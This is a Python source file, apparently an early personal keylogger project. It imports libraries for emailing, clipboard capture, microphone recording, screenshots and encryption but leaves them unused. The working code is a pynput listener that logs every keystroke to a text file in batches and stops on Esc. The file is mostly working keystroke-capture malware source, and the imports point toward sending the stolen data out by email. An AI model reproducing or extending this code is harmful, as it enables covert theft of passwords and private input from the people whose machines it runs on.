# Libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process,freeze_support
from PIL import ImageGrab

keys_information = "key_log.txt"

file_path = "C:\\Users\\itsni\\PycharmProjects\\keylogger\\pythonProject1\\project"
extend = "\\"

count = 0
keys = []


def write_file(keys):
    with open("logs.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", ",")
            if k.find("space") != -1:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    if count >= 5:
        count = 0
        write_file(keys)
        keys = []
    print("{0} pressed".format(key))


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


